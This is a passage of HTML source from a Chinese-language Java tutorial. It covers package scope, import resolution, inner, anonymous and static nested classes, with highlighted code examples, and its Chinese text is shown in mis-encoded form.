&lt;li>åŒ…æ²¡æœ‰çˆ¶å­å…³ç³»ï¼java.utilå’Œjava.util.zipæ˜¯ä¸åŒçš„åŒ…ï¼Œä¸¤è€…æ²¡æœ‰ä»»ä½•ç»§æ‰¿å…³ç³»&lt;/li>
&lt;li>æ‰€æœ‰Javaæ–‡ä»¶å¯¹åº”çš„ç›®å½•å±‚æ¬¡è¦å’ŒåŒ…çš„å±‚æ¬¡ä¸€è‡´ï¼Œç¼–è¯‘åçš„&lt;code>.class&lt;/code>æ–‡ä»¶ä¹Ÿéœ€è¦æŒ‰ç…§åŒ…ç»“æ„å­˜æ”¾&lt;/li>
&lt;li>ä½äºåŒä¸€ä¸ªåŒ…çš„ç±»ï¼Œå¯ä»¥è®¿é—®åŒ…ä½œç”¨åŸŸçš„å­—æ®µå’Œæ–¹æ³•ã€‚ä¸ç”¨&lt;code>public&lt;/code>ã€&lt;code>protected&lt;/code>ã€&lt;code>private&lt;/code>ä¿®é¥°çš„å­—æ®µå’Œæ–¹æ³•å°±æ˜¯åŒ…ä½œç”¨åŸŸ&lt;/li>
&lt;li>&lt;code>import static&lt;/code>å¯ä»¥å¯¼å…¥å¯ä»¥å¯¼å…¥ä¸€ä¸ªç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•&lt;/li>
&lt;li>Javaç¼–è¯‘å™¨æœ€ç»ˆç¼–è¯‘å‡ºçš„&lt;code>.class&lt;/code>æ–‡ä»¶åªä½¿ç”¨å®Œæ•´ç±»å(è¶…é•¿)ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨åœ¨é‡åˆ°&lt;code>class&lt;/code>åç§°æ—¶å¦‚æœéå®Œæ•´ç±»åï¼ŒæŒ‰ç…§ å½“å‰package-&amp;gt;importçš„åŒ…-&amp;gt;java.langåŒ… çš„é¡ºåºè¿›è¡ŒæŸ¥æ‰¾&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Main.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">test&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.text.Format&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">List&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨å®Œæ•´ç±»å -&amp;gt; java.util.List
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Format&lt;/span> &lt;span style="color:#111">format&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨importçš„ç±» -&amp;gt; java.text.Format
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hi&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨java.langåŒ…çš„String -&amp;gt; java.lang.String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨java.langåŒ…çš„System -&amp;gt; java.lang.System
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">MessageFormat&lt;/span> &lt;span style="color:#111">mf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ç¼–è¯‘é”™è¯¯ï¼šæ— æ³•æ‰¾åˆ°MessageFormat: MessageFormat cannot be resolved to a type
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ç¼–å†™classæ—¶ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨å¸®æˆ‘ä»¬&lt;code>import java.lang.*&lt;/code>(ä¸åŒ…å«&lt;code>java.lang.reflect&lt;/code>è¿™æ ·çš„åŒ…)å’Œ&lt;code>import&lt;/code>å½“å‰&lt;code>package&lt;/code>çš„å…¶å®ƒclass&lt;/li>
&lt;li>æŠŠæ–¹æ³•å®šä¹‰ä¸º&lt;code>package&lt;/code>æƒé™æœ‰åŠ©äºæµ‹è¯•ï¼Œå› ä¸ºæµ‹è¯•ç±»å’Œè¢«æµ‹è¯•ç±»åªè¦ä½äºåŒä¸€ä¸ª&lt;code>package&lt;/code>ï¼Œæµ‹è¯•ä»£ç å°±å¯ä»¥è®¿é—®è¢«æµ‹è¯•ç±»çš„&lt;code>package&lt;/code>æƒé™æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;h3 id="å†…éƒ¨ç±»">å†…éƒ¨ç±»&lt;/h3>
&lt;ul>
&lt;li>æˆ–ç§°nested classåµŒå¥—ç±»&lt;/li>
&lt;li>Inner Classå®šä¹‰åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨ï¼Œå®ƒçš„å®ä¾‹ä¸èƒ½å•ç‹¬å­˜åœ¨&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// å®ä¾‹åŒ–ä¸€ä¸ªOuter
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#111">inner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">new&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// å®ä¾‹åŒ–ä¸€ä¸ªInner
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">inner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨Outerçš„æ„é€ æ–¹æ³•æ¥åˆ›å»ºInnerå®ä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŸå› æ˜¯Inner Classé™¤äº†&lt;code>this&lt;/code>æŒ‡å‘è‡ªå·±ä»¥å¤–è¿˜éšå«åœ°æŒæœ‰ä¸€ä¸ªOuter Classå®ä¾‹ï¼Œå¯ä»¥ç”¨&lt;code>Outer.this&lt;/code>è®¿é—®è¿™ä¸ªå®ä¾‹ï¼›æ‰€ä»¥ï¼Œå®ä¾‹åŒ–ä¸€ä¸ªInner Classä¸èƒ½è„±ç¦»Outerå®ä¾‹&lt;/p>
&lt;p>Inner Classå’Œæ™®é€šClassç›¸æ¯”ï¼Œé™¤äº†èƒ½å¼•ç”¨Outerå®ä¾‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„ç‰¹æƒï¼šå¯ä»¥ä¿®æ”¹Outer Classçš„&lt;code>private&lt;/code>å­—æ®µï¼›å› ä¸ºInner Classçš„ä½œç”¨åŸŸåœ¨Outer Classå†…éƒ¨ï¼Œæ‰€ä»¥èƒ½è®¿é—®Outer Classçš„&lt;code>private&lt;/code>å­—æ®µå’Œæ–¹æ³•&lt;/p>
&lt;p>è§‚å¯ŸJavaç¼–è¯‘å™¨ç¼–è¯‘åçš„&lt;code>.class&lt;/code>æ–‡ä»¶å¯ä»¥å‘ç°ï¼Œ&lt;code>Outer&lt;/code>ç±»è¢«ç¼–è¯‘ä¸º&lt;code>Outer.class&lt;/code>ï¼Œè€Œ&lt;code>Inner&lt;/code>ç±»è¢«ç¼–è¯‘ä¸º&lt;code>Outer$Inner.class&lt;/code>&lt;/p>
&lt;ul>
&lt;li>è¿˜å¯ä»¥é€šè¿‡åŒ¿åç±»Anonymous Classæ¥å®šä¹‰Inner Classï¼Œä¸¤è€…æœ¬è´¨ä¸Šç›¸åŒ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Runnabale&lt;/code>æœ¬èº«æ˜¯ä¸èƒ½å®ä¾‹åŒ–çš„æ¥å£ï¼Œè¿™é‡Œå®é™…å®šä¹‰äº†ä¸€ä¸ªå®ç°äº†&lt;code>Runnable&lt;/code>æ¥å£çš„åŒ¿åç±»ï¼Œå¹¶é€šè¿‡newå®ä¾‹åŒ– ä¹‹åè½¬å‹ä¸ºRunnableï¼Œè¿‡ç¨‹å¾ˆå¤šä½†æ˜¯å®ç°èµ·æ¥ä»£ç å¾ˆç®€æ´ï¼›å’ŒInner Classä¸€æ ·ä¹Ÿå¯ä»¥è®¿é—®Outer Classçš„&lt;code>private&lt;/code>&lt;/p>
&lt;ul>
&lt;li>åŒ¿åç±»åœ¨å®šä¹‰æ—¶å¿…é¡»å®ä¾‹åŒ–ï¼Œæœ€ç»ˆä¼šç¼–è¯‘ä¸º&lt;code>Outer$1.class&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å®ç°å¿…è¦çš„æŠ½è±¡æ–¹æ³•...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ç»§æ‰¿è‡ªæ™®é€šç±»çš„åŒ¿åç±»ï¼Œç¼–è¯‘ä¸º&lt;code>Main$1.class&lt;/code>å’Œ&lt;code>Main$2.class&lt;/code>ä¸¤ä¸ªåŒ¿åç±»æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{};&lt;/span> &lt;span style="color:#75715e">// åŒ¿åç±»!
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;B&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™æ€å†…éƒ¨ç±»ç¤ºä¾‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
